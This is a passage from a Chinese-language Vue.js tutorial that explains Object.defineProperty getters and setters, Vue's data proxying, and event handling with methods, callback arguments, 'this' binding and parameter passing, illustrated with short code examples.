<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">19</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">	<span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> num</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511102321520.png" alt="image-20220511102321520"></p>
<p>此时修改<code>num</code>的值之后，再次访问<code>person</code>对象时，会调用<code>age</code>的<code>getter</code>，此时拿到的就是<code>num</code>更新后的值</p>
<p>所以<code>getter</code>函数的返回值，一般是写新增属性依赖的其他变量</p>
<p>简写：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> num</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="set-配置项"><a href="#set-配置项" class="headerlink" title="set()配置项"></a><code>set()</code>配置项</h4><p>当有人修改<code>person</code>的<code>age</code>属性时，<code>set</code>函数<code>(setter)</code>就会被调用，且会收到修改的具体值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">18</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">	<span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人读取age属性了&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> num</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="title function_">set</span>(<span class="params">value</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人修改age属性了，且值为：&#x27;</span>,value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511103510715.png" alt="image-20220511103510715"></p>
<p>此时我们修改<code>age</code>的属性值，<code>setter</code>函数被调用了，我们也拿到了修改的值</p>
<p>但<code>person</code>的<code>age</code>并没有变化，我们只需要将修改的<code>value</code>赋值给<code>num</code>即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人读取age属性了&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> num</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="title function_">set</span>(<span class="params">value</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人修改age属性了，且值为：&#x27;</span>,value)</span><br><span class="line">		num = value <span class="comment">// 将修改后的值，赋值给num</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511103721063.png" alt="image-20220511103721063"></p>
<p>我们将修改后的值赋值给<code>num</code>后，下次再读取<code>age</code>的属性时，就会调用<code>getter</code>获得最新的值</p>
<p>变量<code>number</code>和对象<code>person</code>是两个东西，通过<code>defineProperty</code>将这两者关联起来</p>
<h4 id="理解数据代理"><a href="#理解数据代理" class="headerlink" title="理解数据代理"></a>理解数据代理</h4><p> 通过一个对象代理对另一个对象中属性的操作（读&#x2F;写）</p>
<ul>
<li>有一个对象<code>obj</code>，它有一个属性<code>x</code>，<code>obj</code>自身对<code>x</code>可以进行任务操作</li>
<li>但我希望，可以通过另一个对象<code>obj2</code>来修改<code>obj</code>中的<code>x</code>属性</li>
</ul>
<p>实现一个最简单的数据代理：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">x</span>: <span class="number">200</span>&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="attr">y</span>: <span class="number">200</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj2, <span class="string">&#x27;x&#x27;</span>, &#123;</span><br><span class="line">	<span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> obj.<span class="property">x</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="title function_">set</span>(<span class="params">value</span>)  &#123;</span><br><span class="line">		obj.<span class="property">x</span> = value</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这样<code>obj2</code>就对<code>obj</code>的<code>x</code>属性实现了代理，可以通过<code>obj2</code>来读写<code>obj</code>上的<code>x</code>属性</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511105253154.png" alt="image-20220511105253154"></p>
<h4 id="Vue中的数据代理"><a href="#Vue中的数据代理" class="headerlink" title="Vue中的数据代理"></a><code>Vue</code>中的数据代理</h4><p>如图可以看到，<code>vue</code>实例上，有<code>data</code>里面的值，就是通过数据代理得到的</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511110026218.png" alt="image-20220511110026218"></p>
<p>现在我们来验证一下</p>
<p>验证<code>getter</code>:</p>
<p>控制台打印<code>vm.name</code>，输出的就是定义的<code>data</code>里面的结果，说明<code>getter</code>是通的</p>
<p>验证<code>setter</code>：</p>
<p>有一点已经明确的是，<code>vm</code>实例对象上，肯定有一个地方存着<code>data</code>属性的值，不然<code>getter/setter</code>的时候没地方去操作，这个属性值是<code>vm._data</code>。现在要做的是，就是证明<code>vm</code>实例上的<code>_data</code>，就是我们自己定义的<code>data</code></p>
<p>将<code>data</code>抽离出来，这样我们在操作完<code>vm._data</code>后，也可以看到自己定义的<code>data</code>有没有变了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">	<span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">       data</span><br><span class="line">   &#125;)</span><br><span class="line">   vm.$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(vm)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511142145893.png" alt="image-20220511142145893"></p>
<p>结果发现，我们修改<code>vm</code>实例上的<code>_data</code>后，和自定义<code>data</code>比较后，是相等的。说明自定义<code>data</code>也变化了，至此，<code>setter</code>也通了</p>
<h3 id="1-7-2-小结：数据代理"><a href="#1-7-2-小结：数据代理" class="headerlink" title="1.7.2.小结：数据代理"></a>1.7.2.小结：数据代理</h3><p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511143124575.png" alt="image-20220511143124575"></p>
<ul>
<li><code>Vue</code>中的数据代理<ul>
<li>通过<code>vm</code>对象来代理<code>data</code>对象中的属性的操作（读&#x2F;写）</li>
</ul>
</li>
<li><code>Vue</code>中数据代理的好处<ul>
<li>更加方便的操作<code>data</code>中的数据</li>
</ul>
</li>
<li>基本原理<ul>
<li>通过<code>Object.defineProperty()</code>把<code>data</code>对象中所有属性添加到<code>vm</code>上</li>
<li>为每一个添加到<code>vm</code>上的属性，都指定一个<code>getter/setter</code></li>
<li>在<code>getter/setter</code>内部去操作（读&#x2F;写）<code>data</code>中对应的属性</li>
</ul>
</li>
</ul>
<h3 id="1-7-3-小问题"><a href="#1-7-3-小问题" class="headerlink" title="1.7.3.小问题"></a>1.7.3.小问题</h3><p>我们仔细观察下<code>vm._data</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511144111549.png" alt="image-20220511144111549"></p>
<p>的确，它就是我们自定义的<code>data</code></p>
<p>但是咧，<code>vue</code>还帮我们做了数据劫持，因为当<code>vm._data = &#39;modify&#39;</code>时，<code>vue</code>还要去更新页面，所以要能够监听到<code>_data</code>的变化</p>
<p>关于数据劫持，后面会详细说明</p>
<h2 id="1-8-事件处理"><a href="#1-8-事件处理" class="headerlink" title="1.8.事件处理"></a>1.8.事件处理</h2><h3 id="1-8-1-methods属性配置回调函数"><a href="#1-8-1-methods属性配置回调函数" class="headerlink" title="1.8.1.methods属性配置回调函数"></a>1.8.1.<code>methods</code>属性配置回调函数</h3><p>容器上事件的回调函数，应该写在<code>vue</code>实例对象的配置对象里，否则会报错</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">function</span> <span class="title function_">showInfo</span>(<span class="params"></span>) &#123; <span class="comment">// 事件的回调定义在vue实例外部</span></span></span><br><span class="line"><span class="language-javascript">				<span class="title function_">alert</span>(<span class="string">&#x27;Hello&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			&#125; </span></span><br><span class="line"><span class="language-javascript">			</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span></span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript">			</span></span><br><span class="line"><span class="language-javascript">			vm.$mount(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(vm)</span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>报错信息：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511145422711.png" alt="image-20220511145422711"></p>
<p>通过<code>methods</code>属性，配置事件的回调：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	<span class="attr">data</span>: &#123;</span><br><span class="line">		<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">		<span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">methods</span>: &#123;</span><br><span class="line">		<span class="title function_">showInfo</span>(<span class="params"></span>) &#123; <span class="comment">// 对象里配方法，直接 方法名()&#123;&#125; 即可</span></span><br><span class="line">			<span class="title function_">alert</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511145835103.png" alt="image-20220511145835103"></p>
<h3 id="1-8-2-回调函数的参数"><a href="#1-8-2-回调函数的参数" class="headerlink" title="1.8.2.回调函数的参数"></a>1.8.2.回调函数的参数</h3><p>默认第一个参数，是<code>event</code>对象，原生点击事件就有</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="title function_">showInfo</span>(<span class="params">a, b, c, d</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511150054804.png" alt="image-20220511150054804"></p>
<p>一般用<code>event</code>表示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="title function_">showInfo</span>(<span class="params">event</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(event)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-8-3-回调函数中的this指向"><a href="#1-8-3-回调函数中的this指向" class="headerlink" title="1.8.3.回调函数中的this指向"></a>1.8.3.回调函数中的<code>this</code>指向</h3><h4 id="this指向vm"><a href="#this指向vm" class="headerlink" title="this指向vm"></a><code>this</code>指向<code>vm</code></h4><p><code>methods</code>配置项里，定义的回调函数如果写的是正常的函数，<code>this</code>指向<code>vue</code>实例对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="title function_">showInfo</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是this:&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是vm:&#x27;</span>, vm)</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === vm)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511150713286.png" alt="image-20220511150713286"></p>
<p>注意：<code>showInfo</code>是点击事件对应的回调，<code>vue</code>实例已经创建了，所以可以拿到<code>vm</code></p>
<h4 id="this不指向vm"><a href="#this不指向vm" class="headerlink" title="this不指向vm"></a><code>this</code>不指向<code>vm</code></h4><ul>
<li><p>如果回调函数写成了箭头函数，<code>this</code>会向外找，指向<code>window</code>，因为箭头函数没有自己的<code>this</code>指向</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="attr">showInfo</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是this:&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是vm:&#x27;</span>, vm)</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === vm)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511151329441.png" alt="image-20220511151329441"></p>
<p>所以，所有被<code>vue</code>实例管理的函数，最好都写成普通函数，不要写成箭头函数</p>
</li>
<li><p>如果回调函数内部还嵌套了函数，则内部的函数中<code>this</code>的指向，也指向<code>window</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="title function_">showInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">function</span> <span class="title function_">inner</span>(<span class="params"></span>) &#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是回调函数嵌套函数内部的this:&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === vm)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_">inner</span>()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511152227088.png" alt="image-20220511152227088"></p>
<p>一般我们会定义一个变量，先存储<code>this</code>，然后在内部函数中使用这个变量，这样在内部函数中，就可以获取到<code>vm</code>了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">	<span class="title function_">showInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> self = <span class="variable language_">this</span></span><br><span class="line">		<span class="keyword">function</span> <span class="title function_">inner</span>(<span class="params"></span>) &#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我是回调函数嵌套函数内部的self:&#x27;</span>, self)</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(self === vm)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_">inner</span>()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>



<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511152430482.png" alt="image-20220511152430482"></p>
</li>
</ul>
<h3 id="1-8-4-v-on的简写"><a href="#1-8-4-v-on的简写" class="headerlink" title="1.8.4.v-on的简写"></a>1.8.4.<code>v-on</code>的简写</h3><p><code>v-on:click=&quot;showInfo&quot;</code>等价于<code>@click=&quot;showInfo&quot;</code></p>
<h3 id="1-8-5-点击事件中回调函数的传参"><a href="#1-8-5-点击事件中回调函数的传参" class="headerlink" title="1.8.5.点击事件中回调函数的传参"></a>1.8.5.点击事件中回调函数的传参</h3><h4 id="传递参数的基本语法"><a href="#传递参数的基本语法" class="headerlink" title="传递参数的基本语法"></a>传递参数的基本语法</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;showInfo(666)&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span> // 页面传递参数</span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">address</span>: <span class="string">&#x27;beijing&#x27;</span></span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">showInfo</span>(<span class="params">value</span>)&#123; <span class="comment">// 回调函数接收参数</span></span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;,</span></span><br><span class="line"><span class="language-javascript">			&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			vm.$mount(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511152959746.png" alt="image-20220511152959746"></p>
<h4 id="event对象丢失的解决办法"><a href="#event对象丢失的解决办法" class="headerlink" title="event对象丢失的解决办法"></a><code>event</code>对象丢失的解决办法</h4><p>我们多接收几个参数：</p>
